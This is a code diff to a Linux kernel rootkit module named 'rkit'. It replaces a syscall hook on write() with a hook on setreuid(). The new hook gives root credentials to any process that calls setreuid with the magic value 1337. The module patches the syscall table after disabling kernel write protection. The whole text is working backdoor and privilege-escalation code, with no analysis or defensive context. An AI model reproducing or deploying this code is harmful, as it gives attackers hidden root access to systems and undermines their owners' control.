@@ -17,7 +17,7 @@ module_exit(rkit_exit);
 #define END_CHECK 0xffffffffa2000000
 typedef uint64_t psize;
 
-asmlinkage ssize_t (*o_write)(int fd, const char __user *buff, ssize_t count);
+asmlinkage ssize_t (*o_setreuid) (uid_t ruid, uid_t euid);
 
 psize *sys_call_table;
 psize **find(void) {
@@ -34,18 +34,14 @@ psize **find(void) {
     return NULL;
 }
 
-asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
-    int r;
-    char *proc_protect = "h1dd3n";
-    char *kbuff = (char *) kmalloc(256, GFP_KERNEL);
-    copy_from_user(kbuff, buff, 255);
-    if (strstr(kbuff, proc_protect)) {
-         kfree(kbuff);
-         return EEXIST;
+asmlinkage ssize_t rkit_setreuid(uid_t ruid, uid_t euid) {
+    int leet = 1337;
+    if ((ruid == leet) && (euid == leet)) {
+        struct cred *new = prepare_creds();
+	new->uid = new->euid = make_kuid(current_user_ns(),0);
+	commit_creds(new);
     }
-    r = (*o_write)(fd, buff, count);
-    kfree(kbuff);
-    return r;
+    return o_setreuid(ruid, euid);
 }
 
 int rkit_init(void) {
@@ -59,7 +55,7 @@ int rkit_init(void) {
     }
 
     write_cr0(read_cr0() & (~ 0x10000));
-    o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);
+    o_setreuid = (void *) xchg(&sys_call_table[__NR_setreuid], (psize)rkit_setreuid);
     write_cr0(read_cr0() | 0x10000);
 
     return 0;
@@ -67,7 +63,7 @@ int rkit_init(void) {
 
 void rkit_exit(void) {
     write_cr0(read_cr0() & (~ 0x10000));
-    xchg(&sys_call_table[__NR_write], (psize)o_write);
+    xchg(&sys_call_table[__NR_setreuid], o_setreuid);
     write_cr0(read_cr0() | 0x10000);
     printk("rkit: Module unloaded\n");
 }
